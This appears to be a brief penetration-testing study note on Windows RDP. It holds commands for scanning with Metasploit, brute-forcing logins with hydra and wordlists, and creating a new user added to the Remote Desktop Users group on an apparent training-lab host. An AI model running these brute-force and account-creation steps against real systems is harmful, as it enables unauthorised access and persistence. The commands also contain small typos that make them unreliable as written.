---
title: 'RDP'
description: ''
pubDate: 'Jul 03 2022'
heroImage: '/ldapi.jpg'
tag: ['windows', 'RDP']
---

### Information

- The Remote Dektop Protocol is propriertary GUI remote access protocol developed by Microsoft and is used to remotely connect and interact with a windows system.

- Uses 3389 TCP port by default, .

- Requires authentication.

- Can perform a brute-force attack

```bash
# Detect if that port its really a rdp.
$ mfsconsole use auxiliary/scanner/rdp/rdp_scanner

# Brute force.
$ hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/linux_pass.txt rdp://target -s 3389

$ xfreerdp /u:administrator /p:password123  /v:ta rget:port
```

crear usuario rdp

```bash
net user guest_1 guestpwd /add
net localgroup "Remote Desktop Users" guest_1 /add
net user
##

xfreerdp /u:guest_1 /p:guestpwd /v:demo.ine.local

```
